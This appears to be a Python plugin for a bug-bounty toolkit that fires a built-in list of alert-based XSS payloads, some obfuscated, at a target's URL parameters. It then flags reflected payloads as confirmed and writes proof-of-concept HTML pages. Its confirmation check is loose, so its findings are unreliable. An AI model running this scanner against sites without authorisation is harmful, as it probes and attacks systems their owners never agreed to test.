#!/usr/bin/env python3
# plugins/exploit/xss_verify.py - XSS verification plugin

import os
import re
import json
import time
import random
import urllib.parse
import requests
from typing import Dict, Any, List, Optional
from bbhunt.core.plugin import Plugin

class XSSVerifyPlugin(Plugin):
    """XSS vulnerability verification plugin."""
    
    __plugin_name__ = "xss_verify"
    __plugin_description__ = "Verify XSS vulnerabilities"
    __plugin_version__ = "1.0.0"
    __plugin_category__ = "exploit"
    __plugin_dependencies__ = []
    __plugin_resources__ = {
        "memory": "500MB",
        "cpu": 1,
        "disk": "50MB",
        "network": True
    }
    
    def setup(self):
        """Initialize plugin."""
        # Disable SSL warnings
        try:
            requests.packages.urllib3.disable_warnings()
        except:
            pass
        
        # Initialize session
        self.session = requests.Session()
    
    def execute(self, target: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Verify XSS vulnerabilities.
        
        Args:
            target: Target domain or URL
            options: Plugin options
            
        Returns:
            Dict with results
        """
        options = options or {}
        
        # Parse options
        url = options.get('url', '')
        input_file = options.get('input_file', '')
        user_agent = options.get('user_agent', 'bbhunt-xss-verify')
        custom_payloads = options.get('payloads', [])
        
        # Set user agent
        self.session.headers.update({'User-Agent': user_agent})
        
        # Process targets
        targets = []
        
        if url:
            # Single URL with INJECT placeholder
            if "INJECT" in url:
                targets.append(url)
            else:
                return {
                    "status": "error",
                    "message": "URL must contain INJECT placeholder",
                    "data": {}
                }
        elif input_file:
            # Read targets from file
            if os.path.exists(input_file):
                with open(input_file, 'r') as f:
                    targets = [line.strip() for line in f.readlines()]
                
                # Filter targets to only include those with INJECT placeholder
                targets = [t for t in targets if "INJECT" in t]
                
                if not targets:
                    return {
                        "status": "error",
                        "message": "No valid targets found in input file",
                        "data": {}
                    }
            else:
                return {
                    "status": "error",
                    "message": f"Input file not found: {input_file}",
                    "data": {}
                }
        else:
            # Try to construct a URL with common injection points
            if not target.startswith(('http://', 'https://')):
                base_url = f"https://{target}"
            else:
                base_url = target
            
            # Common injection points
            targets = [
                f"{base_url}/search?q=INJECT",
                f"{base_url}/?s=INJECT",
                f"{base_url}/index.php?id=INJECT"
            ]
        
        # Create output directory
        target_domain = target.replace('http://', '').replace('https://', '').split('/')[0]
        exploit_dir = os.path.join('data', 'targets', target, 'exploit', 'xss')
        os.makedirs(exploit_dir, exist_ok=True)
        
        # Load or generate XSS payloads
        payloads = custom_payloads if custom_payloads else self._generate_xss_payloads()
        
        # Initialize results
        results = {
            "status": "success",
            "message": "",
            "data": {
                "successful_payloads": [],
                "vulnerable_urls": []
            }
        }
        
        # Test each target with each payload
        for target_url in targets:
            self.logger.info(f"Testing XSS on {target_url}")
            
            for payload in payloads:
                # URL encode the payload
                encoded_payload = urllib.parse.quote_plus(payload)
                
                # Replace INJECT placeholder with payload
                test_url = target_url.replace("INJECT", encoded_payload)
                
                try:
                    # Make request
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    # Check if payload appears unfiltered in response
                    if payload in response.text:
                        self.logger.info(f"Potential XSS found with payload: {payload}")
                        self.logger.info(f"URL: {test_url}")
                        
                        # Verify if it's a real XSS
                        if self._confirm_xss(payload, response.text):
                            self.logger.info("XSS vulnerability confirmed!")
                            
                            # Save successful payload and URL
                            results["data"]["successful_payloads"].append(payload)
                            results["data"]["vulnerable_urls"].append({
                                "url": test_url,
                                "payload": payload,
                                "context": self._get_context(payload, response.text)
                            })
                            
                            # Save response for evidence
                            evidence_file = os.path.join(exploit_dir, f"xss_evidence_{len(results['data']['successful_payloads'])}.html")
                            with open(evidence_file, 'w') as f:
                                f.write(response.text)
                            
                            # Create proof of concept
                            self._create_poc(test_url, payload, exploit_dir, len(results["data"]["successful_payloads"]))
                except Exception as e:
                    self.logger.error(f"Error testing payload {payload}: {str(e)}")
        
        # Save results to file
        results_file = os.path.join(exploit_dir, 'xss_results.json')
        with open(results_file, 'w') as f:
            json.dump(results["data"], f, indent=2)
        
        # Update result message
        results["message"] = f"Found {len(results['data']['successful_payloads'])} XSS vulnerabilities"
        
        return results
    
    def _generate_xss_payloads(self) -> List[str]:
        """
        Generate XSS payloads.
        
        Returns:
            List of XSS payloads
        """
        payloads = [
            # Basic alert payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            
            # Event handler payloads
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            
            # JavaScript protocol payloads
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            
            # DOM-based payloads
            "<div id=test tabindex=1 onactivate=alert('XSS')></div>",
            
            # HTML5 payloads
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # Context-breaking payloads
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            
            # Different execution contexts
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>", # alert('XSS');
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,59))</script>" # alert('XSS');
        ]
        
        return payloads
    
    def _confirm_xss(self, payload: str, response: str) -> bool:
        """
        Confirm if a potential XSS is real.
        
        Args:
            payload: XSS payload
            response: HTTP response
            
        Returns:
            True if XSS is confirmed, False otherwise
        """
        # Look for script tags with our payload
        if "<script>" in payload:
            if payload in response:
                return True
        
        # Look for event handlers
        if "on" in payload and "=" in payload:
            # Extract event handler
            handler_match = re.search(r'on\w+\s*=\s*', payload)
            if handler_match and handler_match.group(0) in response:
                return True
        
        # Look for javascript: protocol
        if "javascript:" in payload and "javascript:" in response:
            return True
        
        # If payload is intact in response, it's likely vulnerable
        return payload in response
    
    def _get_context(self, payload: str, response: str) -> str:
        """
        Get the context of the XSS payload in the response.
        
        Args:
            payload: XSS payload
            response: HTTP response
            
        Returns:
            Context string
        """
        # Find position of payload in response
        pos = response.find(payload)
        if pos == -1:
            return ""
        
        # Extract context (50 chars before and after)
        start = max(0, pos - 50)
        end = min(len(response), pos + len(payload) + 50)
        
        context = response[start:end]
        
        # Highlight the payload
        context = context.replace(payload, f"HIGHLIGHT[{payload}]HIGHLIGHT")
        
        return context
    
    def _create_poc(self, url: str, payload: str, output_dir: str, index: int) -> None:
        """
        Create a proof of concept for the XSS vulnerability.
        
        Args:
            url: Vulnerable URL
            payload: XSS payload
            output_dir: Output directory
            index: Index for the filename
        """
        # Create PoC file
        poc_file = os.path.join(output_dir, f"xss_poc_{index}.html")
        
        with open(poc_file, 'w') as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS Proof of Concept</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #d9534f; }}
        .container {{ margin-top: 20px; }}
        .alert {{ padding: 15px; background-color: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; color: #721c24; }}
        .code {{ background: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }}
        .button {{ display: inline-block; background: #d9534f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; }}
    </style>
</head>
<body>
    <h1>XSS Vulnerability Proof of Concept</h1>
    <div class="container">
        <p>This demonstrates a Cross-Site Scripting vulnerability in the application.</p>
        
        <h2>Vulnerability Details</h2>
        <p>The application fails to properly sanitize user input, allowing JavaScript execution in the context of other users' browsers.</p>
        
        <h2>Payload Used</h2>
        <div class="code">{payload}</div>
        
        <h2>Vulnerable URL</h2>
        <div class="code">{url}</div>
        
        <h2>Steps to Reproduce</h2>
        <ol>
            <li>Click the button below to trigger the vulnerability</li>
            <li>Observe that JavaScript executes, demonstrating the XSS vulnerability</li>
        </ol>
        
        <p class="alert">Warning: This is for demonstration purposes only. Do not use maliciously.</p>
        
        <p><a class="button" href="{url}" target="_blank">Trigger Vulnerability</a></p>
    </div>
</body>
</html>""")
    
    @classmethod
    def cli_options(cls) -> List[Dict[str, Any]]:
        """Define CLI options for this plugin."""
        return [
            {
                "name": "--url",
                "help": "URL with INJECT placeholder",
                "type": str
            },
            {
                "name": "--input-file",
                "help": "File containing URLs with INJECT placeholder",
                "type": str
            },
            {
                "name": "--user-agent",
                "help": "Custom User-Agent string",
                "type": str,
                "default": "bbhunt-xss-verify"
            },
            {
                "name": "--payloads-file",
                "help": "File containing custom payloads",
                "type": str
            }
        ]
    
    @classmethod
    def interactive_options(cls) -> List[Dict[str, Any]]:
        """Define interactive prompts for this plugin."""
        return [
            {
                "type": "input",
                "name": "url",
                "message": "URL with INJECT placeholder:",
                "default": ""
            },
            {
                "type": "input",
                "name": "input_file",
                "message": "File containing URLs with INJECT placeholder (leave empty to use URL):",
                "default": ""
            },
            {
                "type": "input",
                "name": "user_agent",
                "message": "Custom User-Agent string:",
                "default": "bbhunt-xss-verify"
            },
            {
                "type": "input",
                "name": "payloads_file",
                "message": "File containing custom payloads (leave empty for default payloads):",
                "default": ""
            }
        ]
